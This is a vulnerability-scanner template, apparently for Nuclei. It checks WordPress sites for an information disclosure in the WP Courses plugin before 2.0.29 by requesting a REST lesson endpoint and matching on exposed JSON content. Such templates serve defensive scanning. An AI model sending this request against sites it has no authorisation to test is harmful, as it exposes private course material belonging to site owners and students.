id: wordpress-wpcourses-info-disclosure
info:
  author: dwisiswant0
  description: Critical Information Disclosure on WP Courses plugin < 2.0.29 exposes
    private course videos and materials
  name: WordPress WP Courses Plugin Information Disclosure
  severity: high
  tags: wordpress,plugin
requests:
- matchers:
  - condition: or
    part: body
    regex:
    - rest_post_invalid_id
    - '"(guid|title|content|excerpt)":{"rendered":'
    type: regex
  - part: header
    type: word
    words:
    - application/json
  - condition: or
    status:
    - 200
    - 404
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-json/wp/v2/lesson/1'
